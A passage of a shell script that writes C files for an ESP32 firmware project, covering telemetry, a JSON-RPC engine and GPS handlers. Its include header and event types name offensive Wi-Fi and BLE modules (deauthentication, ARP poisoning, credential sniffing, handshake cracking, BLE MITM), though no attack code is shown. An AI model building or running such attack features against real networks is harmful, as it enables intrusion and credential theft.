{
    return (health_ai_state_t)atomic_load(&s_state) == HEALTH_AI_STATE_CRITICAL;
}

esp_err_t health_ai_monitor_heal(void)
{
    health_ai_state_t current = (health_ai_state_t)atomic_load(&s_state);
    if (current != HEALTH_AI_STATE_CRITICAL) return ESP_ERR_INVALID_STATE;
    
    atomic_store(&s_state, HEALTH_AI_STATE_HEALING);
    ESP_LOGW(TAG, "Initiating self-healing sequence");
    
    /* 
     * Self-healing stub:
     * In a production system, this would:
     * 1. Clear non-essential caches (e.g., AI model zoo, BLE scanner list)
     * 2. Restart non-critical background tasks
     * 3. Force a garbage collection on the heap
     */
     
    size_t min_free = heap_caps_get_minimum_free_size(MALLOC_CAP_INTERNAL);
    (void)min_free;
    ESP_LOGI(TAG, "Pre-heal min free heap: %u", (unsigned)min_free);
    
    /* TODO: Implement actual cache clearing here */
    
    ESP_LOGI(TAG, "Self-healing sequence complete");
    atomic_store(&s_state, HEALTH_AI_STATE_OK);
    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/health_ai_monitor.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/health_telemetry.c"
/*
 * ============================================================================
 *  health_telemetry.c  —  Health telemetry: heap, PSRAM, CPU temp, uptime
 * ============================================================================
 */

#include <string.h>
#include <stdio.h>
#include <stdatomic.h>
#include <limits.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_heap_caps.h"
#if __has_include("esp_cpu.h")
#include "esp_cpu.h"
#endif
#include "esp_timer.h"
#include "esp_log.h"

/* CPU temp sensor requires esp_driver_tsens; gracefully disable if missing. */
#if __has_include("driver/temperature_sensor.h") && defined(CONFIG_SOC_TEMP_SENSOR_SUPPORTED) && CONFIG_SOC_TEMP_SENSOR_SUPPORTED
#include "driver/temperature_sensor.h"
#define HEALTH_HAS_TSENS 1
#else
#define HEALTH_HAS_TSENS 0
#endif

#include "health_telemetry.h"

static const char *TAG = "health";

/* Internal mutable state, updated by sample_once(). */
static atomic_uint g_uptime_s   = ATOMIC_VAR_INIT(0);
static atomic_uint g_free_heap  = ATOMIC_VAR_INIT(0);
static atomic_uint g_free_psram = ATOMIC_VAR_INIT(0);
static atomic_int  g_cpu_temp   = ATOMIC_VAR_INIT(INT32_MIN);   /* sentinel: unread */
static atomic_uint g_min_heap   = ATOMIC_VAR_INIT(UINT32_MAX);

#if HEALTH_HAS_TSENS
static temperature_sensor_handle_t g_tsens_handle = NULL;
#endif

/*============================================================================*/
static void health_snapshot(health_metrics_t *out)
{
    out->uptime_s      = atomic_load(&g_uptime_s);
    out->free_heap     = atomic_load(&g_free_heap);
    out->free_psram    = atomic_load(&g_free_psram);
    out->cpu_temp_c    = atomic_load(&g_cpu_temp);
    out->min_free_heap = atomic_load(&g_min_heap);
}

/*============================================================================*/
static void sample_once(void)
{
    atomic_store(&g_uptime_s, (unsigned)(esp_timer_get_time() / 1000000ULL));
    atomic_store(&g_free_heap, (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL));
    atomic_store(&g_free_psram, (unsigned)heap_caps_get_free_size(MALLOC_CAP_SPIRAM));

#if HEALTH_HAS_TSENS
    if (g_tsens_handle != NULL) {
        float tsens_val = 0.0f;
        esp_err_t rc = temperature_sensor_get_celsius(g_tsens_handle, &tsens_val);
        if (rc == ESP_OK) {
            atomic_store(&g_cpu_temp, (int)(tsens_val * 100.0f));
        }
    }
#endif

    unsigned free = atomic_load(&g_free_heap);
    unsigned prev = atomic_load(&g_min_heap);
    if (free < prev) {
        atomic_store(&g_min_heap, free);
    }
}

/*============================================================================*/
esp_err_t health_telemetry_init(void)
{
#if HEALTH_HAS_TSENS
    if (g_tsens_handle == NULL) {
        temperature_sensor_config_t tsens_config = {
            .range_min = 20,
            .range_max = 100,
        };
        
        esp_err_t rc = temperature_sensor_install(&tsens_config, &g_tsens_handle);
        if (rc == ESP_OK && g_tsens_handle != NULL) {
            temperature_sensor_enable(g_tsens_handle);
            ESP_LOGI(TAG, "Temperature sensor installed and enabled");
        } else {
            ESP_LOGW(TAG, "Failed to install temperature sensor: %s", esp_err_to_name(rc));
            g_tsens_handle = NULL;
        }
    }
#endif

    sample_once();
    atomic_store(&g_min_heap, atomic_load(&g_free_heap));

    ESP_LOGI(TAG, "init ok  heap=%u PSRAM=%u",
             atomic_load(&g_free_heap),
             atomic_load(&g_free_psram));
    return ESP_OK;
}

/*============================================================================*/
void health_telemetry_task_refresh(void)
{
    sample_once();
}

/*============================================================================*/
esp_err_t health_telemetry_get(health_metrics_t *out)
{
    if (!out) {
        return ESP_ERR_INVALID_ARG;
    }
    sample_once();
    health_snapshot(out);
    return ESP_OK;
}

/*============================================================================*/
esp_err_t health_telemetry_json_export(char *buf, size_t bufsz)
{
    if (!buf || bufsz == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    health_metrics_t m;
    sample_once();
    health_snapshot(&m);

    int n;
    if (m.cpu_temp_c == INT32_MIN) {
        n = snprintf(buf, bufsz,
            "{\"uptime_s\":%u,\"free_heap\":%u,\"free_psram\":%u,"
            "\"cpu_temp_c\":null,\"min_free_heap\":%u}",
            (unsigned)m.uptime_s, (unsigned)m.free_heap, (unsigned)m.free_psram, (unsigned)m.min_free_heap);
    } else {
        n = snprintf(buf, bufsz,
            "{\"uptime_s\":%u,\"free_heap\":%u,\"free_psram\":%u,"
            "\"cpu_temp_c\":%.2f,\"min_free_heap\":%u}",
            (unsigned)m.uptime_s, (unsigned)m.free_heap, (unsigned)m.free_psram,
            (float)m.cpu_temp_c / 100.0f, (unsigned)m.min_free_heap);
    }

    if (n < 0 || (size_t)n >= bufsz) {
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/health_telemetry.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/helper.h"
#ifndef HELPER_H
#define HELPER_H

/* 
 * ============================================================================
 *  AGGREGATE INCLUDE HEADER
 * ============================================================================
 *  WARNING: This file includes almost every module header.
 *  It is intended ONLY for use in main.c or the CLI dispatcher.
 *  
 *  Do NOT include this file in individual module source files (e.g. wifi_sniffer.c).
 *  Doing so creates massive dependency coupling and slows down incremental builds.
 * ============================================================================
 */

/* ─── Standard & ESP-IDF Baseline ───────────────────────────────────────── */
/* 
 * Include foundational types first. This acts as a safety net in case any 
 * individual module header forgot to include <stdint.h> or "esp_err.h".
 */
#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdio.h>
#include <string.h>
#include "esp_err.h"
#include "esp_log.h"

/* ─── Core / Low-Level ──────────────────────────────────────────────────── */
#include "common_types.h"
#include "wifi_tx_fix.h"     /* Raw frame overrides / TX bypass */

/* ─── Platform / System ─────────────────────────────────────────────────── */
#include "platform_config.h"
#include "platform_secure_boot.h"
#include "platform_antitamper.h"
#include "platform_factory_test.h"
#include "platform_fleet.h"
#include "platform_plugins.h"
#include "watchdog.h"
#include "structured_log.h"
#include "health_telemetry.h"
#include "health_ai_monitor.h"

/* ─── Storage / Persistence ─────────────────────────────────────────────── */
#include "nvs_persist.h"
#include "storage_sd.h"
#include "storage_spiffs.h"
#include "wordlist_manager.h"
#include "export.h"

/* ─── Transport / Interface ─────────────────────────────────────────────── */
#include "port_detect.h"
#include "usb_cdc.h"
#include "cli_transport.h"
#include "cli_module.h"
#include "cli_flipper.h"
#include "jsonrpc.h"
#include "jsonrpc_schema.h"
#include "led_indicator.h"

/* ─── Wi-Fi Core ────────────────────────────────────────────────────────── */
#include "wifi_sniffer.h"
#include "channel_hopper.h"
#include "coex.h"
#include "wifi_rrm.h"
#include "pcap_ring.h"

/* ─── Wi-Fi Offensive / Analysis ────────────────────────────────────────── */
#include "deauth_engine.h"
#include "beacon_spam.h"
#include "arp_poison.h"
#include "handshake_crack.h"
#include "cred_sniffer.h"
#include "extra_offense.h"
#include "offensive.h"
#include "attack_planner.h"
#include "reaction_rules.h"
#include "stealth.h"
#include "wardrive.h"

/* ─── Wi-Fi Advanced / Specific ─────────────────────────────────────────── */
#include "pmkid.h"
#include "sae_sidechannel.h"
#include "dragonfly_sim.h"
#include "ft_roam.h"
#include "neighbor_report.h"
#include "btm.h"
#include "wps_pixiedust.h"
#include "eap_capture.h"

/* ─── BLE Core ──────────────────────────────────────────────────────────── */
#include "ble_scanner.h"
#include "ble_ext_adv.h"
#include "ble_periodic.h"
#include "ble_phy.h"
#include "ble_iso.h"
#include "ble_privacy.h"
#include "ble_gatt_client.h"
#include "ble_gatt_enumerator.h"
#include "ble_mitm.h"
#include "ble_rpa_bypass.h"
#include "ble_findmy.h"
#include "ble_smarttag.h"

/* ─── AI / ML ───────────────────────────────────────────────────────────── */
#include "ai_model.h"
#include "ai_classifier.h"
#include "ai_anomaly.h"
#include "ai_fingerprint.h"
#include "ai_channel_predictor.h"
#include "ai_handshake_quality.h"
#include "ai_rogue_detector.h"
#include "ai_deauth_predictor.h"
#include "ai_ble_profiler.h"
#include "ai_training.h"

/* ─── Misc / Other Radios ───────────────────────────────────────────────── */
#include "gps.h"
#include "scheduler.h"
#include "thread_border_router.h"
#include "matter_commissioner.h"
#include "zigbee_sniffer.h"
#include "ota_http.h"

#endif // HELPER_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/helper.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/jsonrpc.c"
/*
 * ============================================================================
 *  jsonrpc.c  —  JSON-RPC 2.0 Engine (Transport Agnostic)
 * ============================================================================
 */

#include "jsonrpc.h"
#include "usb_cdc.h"
#include "cli_transport.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <cJSON.h>
#if __has_include("tusb.h")
#include "tusb.h"
#endif

static const char *TAG = "jsonrpc";

/* -------------------------------------------------------------------------
 *  TX Queue Architecture (Non-blocking, ISR-Safe)
 * ----------------------------------------------------------------------- */
typedef struct {
    char *data; /* malloc'd string, must be freed by TX task */
} jsonrpc_tx_msg_t;

static QueueHandle_t g_tx_queue = NULL;
static TaskHandle_t g_tx_task_handle = NULL;
static jsonrpc_dispatch_t *g_dispatch = NULL;

/* -------------------------------------------------------------------------
 *  TinyUSB Callbacks (Keep here or move to usb_cdc.c)
 * ----------------------------------------------------------------------- */
static bool g_dtr_prev = false;

void tud_cdc_line_state_cb(uint8_t itf, bool dtr, bool rts)
{
    (void)itf;
    if (g_dtr_prev && !dtr) {
        usb_cdc_break_signal();
    }
    g_dtr_prev = dtr;
    usb_cdc_set_dtr_rts(dtr, rts);
}

#if __has_include("tusb.h")
void tud_cdc_line_coding_cb(uint8_t itf, cdc_line_coding_t const *coding)
{
    (void)itf;
    if (coding == NULL) return;

    usb_cdc_line_coding_t lc = {
        .bit_rate   = coding->bit_rate,
        .data_bits  = coding->data_bits,
        .parity     = coding->parity,
        .stop_bits  = coding->stop_bits,
    };
    usb_cdc_set_line_coding(&lc);
}
#endif

/* -------------------------------------------------------------------------
 *  TX Task: Drains queue and writes to active transport
 * ----------------------------------------------------------------------- */
static void jsonrpc_tx_task(void *arg)
{
    jsonrpc_tx_msg_t msg;
    
    while (1) {
        if (xQueueReceive(g_tx_queue, &msg, portMAX_DELAY) == pdTRUE) {
            const cli_transport_t *t = cli_transport_get();
            if (t && t->connected()) {
                /* Write to transport. This may block if USB is backed up,
                 * but only this task blocks, not the Wi-Fi/BLE stacks. */
                t->write(msg.data, strlen(msg.data));
            }
            free(msg.data);
        }
    }
}

static esp_err_t queue_tx_message(const char *str)
{
    if (!g_tx_queue || !str) return ESP_ERR_INVALID_STATE;
    
    size_t len = strlen(str);
    char *copy = malloc(len + 2); /* +2 for \n and \0 */
    if (!copy) return ESP_ERR_NO_MEM;
    
    memcpy(copy, str, len);
    copy[len] = '\n';
    copy[len + 1] = '\0';
    
    jsonrpc_tx_msg_t msg = { .data = copy };
    
    /* Non-blocking send. If queue is full, drop the message (backpressure). */
    if (xQueueSend(g_tx_queue, &msg, 0) != pdTRUE) {
        free(copy);
        ESP_LOGW(TAG, "TX queue full, dropping message");
        return ESP_ERR_NO_MEM;
    }
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Response Builders
 * ----------------------------------------------------------------------- */
static esp_err_t jsonrpc_tx_error(int32_t id, int32_t code, const char *message, const char *data_json)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return ESP_ERR_NO_MEM;

    cJSON_AddStringToObject(root, "jsonrpc", "2.0");
    if (id != 0) cJSON_AddNumberToObject(root, "id", id);
    
    cJSON *err = cJSON_CreateObject();
    if (!err) { cJSON_Delete(root); return ESP_ERR_NO_MEM; }
    
    cJSON_AddNumberToObject(err, "code", code);
    cJSON_AddStringToObject(err, "message", message ? message : "Internal error");
    if (data_json) cJSON_AddRawToObject(err, "data", data_json);
    cJSON_AddItemToObject(root, "error", err);

    char *out = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    if (!out) return ESP_ERR_NO_MEM;

    esp_err_t ret = queue_tx_message(out);
    cJSON_free(out);
    return ret;
}

static esp_err_t jsonrpc_tx_result(int32_t id, const char *result_json)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return ESP_ERR_NO_MEM;

    cJSON_AddStringToObject(root, "jsonrpc", "2.0");
    if (id != 0) cJSON_AddNumberToObject(root, "id", id);

    if (result_json) {
        cJSON *result = cJSON_Parse(result_json);
        if (result) {
            cJSON_AddItemToObject(root, "result", result);
        } else {
            cJSON_AddStringToObject(root, "result", result_json); /* Fallback to raw string */
        }
    } else {
        cJSON_AddTrueToObject(root, "result");
    }

    char *out = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    if (!out) return ESP_ERR_NO_MEM;

    esp_err_t ret = queue_tx_message(out);
    cJSON_free(out);
    return ret;
}

/* -------------------------------------------------------------------------
 *  Method Dispatch
 * ----------------------------------------------------------------------- */
static esp_err_t jsonrpc_dispatch_call(const char *method, const char *params_json, int32_t id)
{
    if (!g_dispatch || !g_dispatch->methods) {
        return jsonrpc_tx_error(id, -32603, "Internal error", NULL);
    }

    for (uint16_t i = 0; i < g_dispatch->method_count; i++) {
        if (strcmp(g_dispatch->methods[i].name, method) == 0) {
            char resp[JSONRPC_MAX_LINE];
            memset(resp, 0, sizeof(resp));

            esp_err_t r = g_dispatch->methods[i].fn(method, params_json, resp, sizeof(resp) - 1, g_dispatch->methods[i].user_ctx);
            
            if (r == ESP_OK) {
                return jsonrpc_tx_result(id, resp[0] ? resp : NULL);
            }

            char data_buf[128];
            snprintf(data_buf, sizeof(data_buf), "{\"module\":\"jsonrpc\",\"esp_err\":\"%s\"}", esp_err_to_name(r));
            return jsonrpc_tx_error(id, -32603, "Internal error", data_buf);
        }
    }

    return jsonrpc_tx_error(id, -32601, "Method not found", NULL);
}

/* -------------------------------------------------------------------------
 *  Frame Parser (Called by cli_transport)
 * ----------------------------------------------------------------------- */
void jsonrpc_handle_message(const char *frame)
{
    if (!frame || frame[0] == '\0') return;

    /* Skip leading whitespace */
    while (*frame == ' ' || *frame == '\t' || *frame == '\n' || *frame == '\r') frame++;

    cJSON *req = cJSON_Parse(frame);
    if (!req) {
        jsonrpc_tx_error(0, -32700, "Parse error", NULL);
        return;
    }

    if (cJSON_IsArray(req)) {
        /* Batch processing */
        int n = cJSON_GetArraySize(req);
        for (int i = 0; i < n; i++) {
            cJSON *item = cJSON_GetArrayItem(req, i);
            if (!cJSON_IsObject(item)) continue;

            cJSON *jmethod = cJSON_GetObjectItem(item, "method");
            cJSON *jid = cJSON_GetObjectItem(item, "id");
            cJSON *jparams = cJSON_GetObjectItem(item, "params");

            if (!jmethod || !cJSON_IsString(jmethod)) continue;

            const char *method = cJSON_GetStringValue(jmethod);
            char *params_str = jparams ? cJSON_PrintUnformatted(jparams) : NULL;
            int32_t id = jid ? (int32_t)cJSON_GetNumberValue(jid) : 0;

            jsonrpc_dispatch_call(method, params_str, id);
            if (params_str) cJSON_free(params_str);
        }
    } else if (cJSON_IsObject(req)) {
        /* Single call */
        cJSON *jmethod = cJSON_GetObjectItem(req, "method");
        cJSON *jid = cJSON_GetObjectItem(req, "id");
        cJSON *jparams = cJSON_GetObjectItem(req, "params");

        if (!jmethod || !cJSON_IsString(jmethod)) {
            jsonrpc_tx_error(0, -32600, "Invalid Request", NULL);
        } else {
            const char *method = cJSON_GetStringValue(jmethod);
            char *params_str = jparams ? cJSON_PrintUnformatted(jparams) : NULL;
            int32_t id = jid ? (int32_t)cJSON_GetNumberValue(jid) : 0;

            jsonrpc_dispatch_call(method, params_str, id);
            if (params_str) cJSON_free(params_str);
        }
    } else {
        jsonrpc_tx_error(0, -32600, "Invalid Request", NULL);
    }

    cJSON_Delete(req);
}

/* -------------------------------------------------------------------------
 *  Public API
 * ----------------------------------------------------------------------- */
esp_err_t jsonrpc_init(jsonrpc_dispatch_t *dispatch, jsonrpc_method_entry_t *method_table, uint16_t method_count, void *user_ctx)
{
    if (!dispatch) return ESP_ERR_INVALID_ARG;

    g_dispatch = dispatch;
    memset(dispatch, 0, sizeof(*dispatch));
    dispatch->methods = method_table;
    dispatch->method_count = method_count;
    dispatch->method_cap = method_count;
    dispatch->user_ctx = user_ctx;
    dispatch->running = true;

    if (!g_tx_queue) {
        g_tx_queue = xQueueCreate(16, sizeof(jsonrpc_tx_msg_t));
        if (!g_tx_queue) return ESP_ERR_NO_MEM;
    }

    if (!g_tx_task_handle) {
        if (xTaskCreatePinnedToCore(jsonrpc_tx_task, "jsonrpc_tx", 4096, NULL, 4, &g_tx_task_handle, 1) != pdPASS) {
            return ESP_FAIL;
        }
    }

    ESP_LOGI(TAG, "initialised with %" PRIu16 " methods", method_count);
    return ESP_OK;
}

esp_err_t jsonrpc_deinit(void)
{
    if (g_dispatch) {
        g_dispatch->running = false;
    }
    
    if (g_tx_task_handle) {
        vTaskDelete(g_tx_task_handle);
        g_tx_task_handle = NULL;
    }
    
    if (g_tx_queue) {
        /* Drain queue before deleting */
        jsonrpc_tx_msg_t msg;
        while (xQueueReceive(g_tx_queue, &msg, 0) == pdTRUE) {
            free(msg.data);
        }
        vQueueDelete(g_tx_queue);
        g_tx_queue = NULL;
    }
    
    g_dispatch = NULL;
    return ESP_OK;
}

esp_err_t jsonrpc_event_post(jsonrpc_event_type_t type, const char *event_json)
{
    if (!event_json || !g_tx_queue) return ESP_ERR_INVALID_STATE;

    const char *type_str = "unknown";
    switch (type) {
        case JSONRPC_EVENT_WIFI_AP:    type_str = "wifi_ap"; break;
        case JSONRPC_EVENT_WIFI_CLIENT:type_str = "wifi_client"; break;
        case JSONRPC_EVENT_BLE_DEV:    type_str = "ble_dev"; break;
        case JSONRPC_EVENT_HANDSHAKE:  type_str = "handshake"; break;
        case JSONRPC_EVENT_CRED:       type_str = "cred"; break;
        case JSONRPC_EVENT_HEALTH:     type_str = "health"; break;
        case JSONRPC_EVENT_PCAP:       type_str = "pcap"; break;
        case JSONRPC_EVENT_DEAUTH:       type_str = "deauth"; break;
        case JSONRPC_EVENT_DIAG:         type_str = "diag"; break;
        case JSONRPC_EVENT_OTA_PROGRESS: type_str = "ota_progress"; break;
        default:                         type_str = "unknown"; break;
    }

    cJSON *root = cJSON_CreateObject();
    if (!root) return ESP_ERR_NO_MEM;

    cJSON_AddStringToObject(root, "jsonrpc", "2.0");
    cJSON_AddStringToObject(root, "method", "event");
    
    cJSON *params = cJSON_CreateObject();
    if (!params) { cJSON_Delete(root); return ESP_ERR_NO_MEM; }
    
    cJSON_AddStringToObject(params, "type", type_str);
    cJSON_AddRawToObject(params, "data", event_json);
    cJSON_AddItemToObject(root, "params", params);

    char *out = cJSON_PrintUnformatted(root);
    cJSON_Delete(root);
    if (!out) return ESP_ERR_NO_MEM;

    esp_err_t ret = queue_tx_message(out);
    cJSON_free(out);
    return ret;
}

bool jsonrpc_is_host_connected(void)
{
    const cli_transport_t *t = cli_transport_get();
    return t ? t->connected() : false;
}

port_transport_t jsonrpc_active_transport(void)
{
    /* Simple getter, assuming port_detect_get_active() exists */
    return port_detect_get_active(); 
}

esp_err_t jsonrpc_send_result(int32_t id, const char *result_json, char *out, size_t out_sz)
{
    (void)id;
    if (out != NULL && out_sz > 0) {
        snprintf(out, out_sz, "%s", result_json ? result_json : "true");
    }
    return ESP_OK;
}

esp_err_t jsonrpc_send_error(int32_t id, int32_t code, const char *message, char *out, size_t out_sz)
{
    (void)id;
    if (out != NULL && out_sz > 0) {
        snprintf(out, out_sz, "{\"error\":{\"code\":%d,\"message\":\"%s\"}}",
                 (int)code, message ? message : "error");
    }
    return (code == JSONRPC_CODE_INVALID_PARAMS) ? ESP_ERR_INVALID_ARG : ESP_FAIL;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/jsonrpc.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/jsonrpc.h"
#ifndef JSONRPC_H
#define JSONRPC_H

#include "common_types.h"
#include "port_detect.h"
#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

#define JSONRPC_MAX_LINE     1024
#define JSONRPC_MAX_DEPTH    8

typedef enum {
    JSONRPC_REQ_INVALID = 0,
    JSONRPC_REQ_CALL,
    JSONRPC_REQ_BATCH_CALL,
    JSONRPC_REQ_NOTIFY
} jsonrpc_request_type_t;

typedef esp_err_t (*jsonrpc_method_fn_t)(const char *method,
                                         const char *params_json,
                                         char *out_json,
                                         size_t out_cap,
                                         void *user_ctx);

typedef struct {
    const char *name;
    jsonrpc_method_fn_t fn;
    void *user_ctx;
} jsonrpc_method_entry_t;

#define JSONRPC_CODE_PARSE_ERROR      (-32700)
#define JSONRPC_CODE_INVALID_REQUEST  (-32600)
#define JSONRPC_CODE_METHOD_NOT_FOUND (-32601)
#define JSONRPC_CODE_INVALID_PARAMS   (-32602)
#define JSONRPC_CODE_INTERNAL_ERROR   (-32603)

typedef enum {
    JSONRPC_EVENT_UNKNOWN = 0,
    JSONRPC_EVENT_WIFI_AP,
    JSONRPC_EVENT_WIFI_CLIENT,
    JSONRPC_EVENT_BLE_DEV,
    JSONRPC_EVENT_HANDSHAKE,
    JSONRPC_EVENT_CRED,
    JSONRPC_EVENT_HEALTH,
    JSONRPC_EVENT_PCAP,
    JSONRPC_EVENT_DEAUTH,
    JSONRPC_EVENT_DIAG,
    JSONRPC_EVENT_OTA_PROGRESS,
    JSONRPC_EVENT_COUNT,
} jsonrpc_event_type_t;

typedef struct {
    jsonrpc_method_entry_t *methods;
    uint16_t method_count;
    uint16_t method_cap;
    void *user_ctx;
    bool running;
} jsonrpc_dispatch_t;

/* ---------------------------------------------------------------------------
 * Public API
 * --------------------------------------------------------------------------- */

esp_err_t jsonrpc_init(jsonrpc_dispatch_t *dispatch,
                       jsonrpc_method_entry_t *method_table,
                       uint16_t method_count,
                       void *user_ctx);

esp_err_t jsonrpc_deinit(void);

/* Called by cli_transport when a JSON-RPC frame is received */
void jsonrpc_handle_message(const char *frame);

esp_err_t jsonrpc_event_post(jsonrpc_event_type_t type, const char *event_json);
esp_err_t jsonrpc_send_result(int32_t id, const char *result_json, char *out, size_t out_sz);
esp_err_t jsonrpc_send_error(int32_t id, int32_t code, const char *message, char *out, size_t out_sz);

bool jsonrpc_is_host_connected(void);
port_transport_t jsonrpc_active_transport(void);

#ifdef __cplusplus
}
#endif

#endif // JSONRPC_H
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/jsonrpc.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/jsonrpc_schema.c"
/*
 * ============================================================================
 *  jsonrpc_schema.c  —  JSON-RPC Schema v1: 7 method groups + async events
 * ============================================================================
 *
 *  T2T Step 3.2 — Research & Brainstorming
 *
 *  Branch A — Single flat dispatch table in jsonrpc.c
 *    Decision: REJECTED. Unmaintainable as method count grows; violates
 *    single-responsibility; mixes schema docs with transport logic.
 *
 *  Branch B — Grouped schema file + separate method table
 *    Decision: ACCEPTED. Clean separation; each group is documented and
 *    versioned; companion app can query schema for UI generation.
 *
 *  Branch C — Dynamic runtime method registration via linked list
 *    Decision: REJECTED. Overhead and fragmentation; static table is
 *    sufficient and safer for embedded.
 * ============================================================================
 */

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "esp_log.h"
#include "cJSON.h"

#include "common_types.h"
#include "jsonrpc.h"
#include "jsonrpc_schema.h"
#include "usb_cdc.h"
#include "health_telemetry.h"
#include "watchdog.h"
#include "structured_log.h"
#include "storage_spiffs.h"
#include "nvs_persist.h"
#include "wifi_sniffer.h"
#include "cli_transport.h"
#include "gps.h"
#include "coex.h"
#include "ai_model.h"
#include "ai_classifier.h"
#include "ai_anomaly.h"
#include "ai_fingerprint.h"
#include "ai_channel_predictor.h"
#include "ai_handshake_quality.h"
#include "ai_rogue_detector.h"
#include "ai_deauth_predictor.h"
#include "ai_ble_profiler.h"
#include "ai_training.h"
#include "wardrive.h"
#include "attack_planner.h"
#include "stealth.h"
#include "scheduler.h"
#include "reaction_rules.h"
#include "export.h"
#include "pcap_ring.h"
#include "offensive.h"
#include "cli_flipper.h"
#include "pmkid.h"
#include "sae_sidechannel.h"
#include "dragonfly_sim.h"
#include "ft_roam.h"
#include "neighbor_report.h"
#include "btm.h"
#include "wps_pixiedust.h"
#include "eap_capture.h"
#include "ble_mitm.h"
#include "ble_gatt_enumerator.h"
#include "ble_rpa_bypass.h"
#include "ble_findmy.h"
#include "ble_smarttag.h"
#include "thread_border_router.h"
#include "matter_commissioner.h"
#include "zigbee_sniffer.h"
#include "platform_secure_boot.h"
#include "platform_antitamper.h"
#include "platform_factory_test.h"
#include "platform_config.h"
#include "platform_plugins.h"
#include "platform_fleet.h"
#include "health_ai_monitor.h"
#include "wordlist_manager.h"
#include "ota_http.h"


#define SCHEMA_VERSION "v1.0.0"

/*============================================================================*/
static esp_err_t rpc_gps_set_fix(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

    gps_fix_t fix;
    memset(&fix, 0, sizeof(fix));

    cJSON *lat = cJSON_GetObjectItem(root, "lat");
    cJSON *lon = cJSON_GetObjectItem(root, "lon");
    cJSON *alt = cJSON_GetObjectItem(root, "alt");
    cJSON *sats = cJSON_GetObjectItem(root, "sats");
    cJSON *fix_q = cJSON_GetObjectItem(root, "fix");
    cJSON *ts = cJSON_GetObjectItem(root, "timestamp");

    if (cJSON_IsNumber(lat)) fix.latitude = cJSON_GetNumberValue(lat);
    if (cJSON_IsNumber(lon)) fix.longitude = cJSON_GetNumberValue(lon);
    if (cJSON_IsNumber(alt)) fix.altitude = cJSON_GetNumberValue(alt);
    if (cJSON_IsNumber(sats)) fix.sat_count = (uint8_t)cJSON_GetNumberValue(sats);
    if (cJSON_IsNumber(fix_q)) fix.fix_quality = (uint8_t)cJSON_GetNumberValue(fix_q);
    if (cJSON_IsNumber(ts)) fix.timestamp = (uint32_t)cJSON_GetNumberValue(ts);

    fix.valid = (fix.latitude != 0.0 || fix.longitude != 0.0) &&
                fix.fix_quality >= 1 && fix.sat_count >= 3;

    esp_err_t rc = gps_set_fix(&fix);
    cJSON_Delete(root);

    if (rc != ESP_OK) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INTERNAL_ERROR,
                                  "gps_set_fix failed", out, out_sz);
    }

    return jsonrpc_send_result(-1, "\"ok\"", out, out_sz);
}

static esp_err_t rpc_gps_get_fix(const char *method, const char *params_json,
                                 char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    gps_fix_t fix;
    bool valid = gps_get_fix(&fix);

    cJSON *root = cJSON_CreateObject();
    cJSON_AddBoolToObject(root, "valid", valid);
    cJSON_AddNumberToObject(root, "lat", fix.latitude);
    cJSON_AddNumberToObject(root, "lon", fix.longitude);
    cJSON_AddNumberToObject(root, "alt", fix.altitude);
    cJSON_AddNumberToObject(root, "sats", fix.sat_count);
    cJSON_AddNumberToObject(root, "fix", fix.fix_quality);
    cJSON_AddNumberToObject(root, "timestamp", fix.timestamp);

    const char *json = cJSON_PrintUnformatted(root);
    esp_err_t rc = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(root);
    return rc;
}

static esp_err_t rpc_gps_status(const char *method, const char *params_json,
                                char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)params_json; (void)user_ctx;
    cJSON *root = cJSON_CreateObject();

    bool valid = gps_is_valid();
    cJSON_AddBoolToObject(root, "valid", valid);
    cJSON_AddStringToObject(root, "source", valid ? "phone" : "none");
    cJSON_AddNumberToObject(root, "timestamp", gps_get_timestamp_us() / 1000000ULL);

    gps_fix_t fix;
    if (gps_get_fix(&fix)) {
        cJSON_AddNumberToObject(root, "lat", fix.latitude);
        cJSON_AddNumberToObject(root, "lon", fix.longitude);
    }

    const char *json = cJSON_PrintUnformatted(root);
    esp_err_t rc = jsonrpc_send_result(-1, json, out, out_sz);
    cJSON_free((void *)json);
    cJSON_Delete(root);
    return rc;
}

/*============================================================================*/
static esp_err_t rpc_coex_set_pref(const char *method, const char *params_json,
                                  char *out, size_t out_sz, void *user_ctx)
{
    (void)method; (void)user_ctx;
    cJSON *root = cJSON_Parse(params_json);
    if (root == NULL) {
        return jsonrpc_send_error(-1, JSONRPC_CODE_INVALID_PARAMS,
                                  "invalid JSON", out, out_sz);
    }

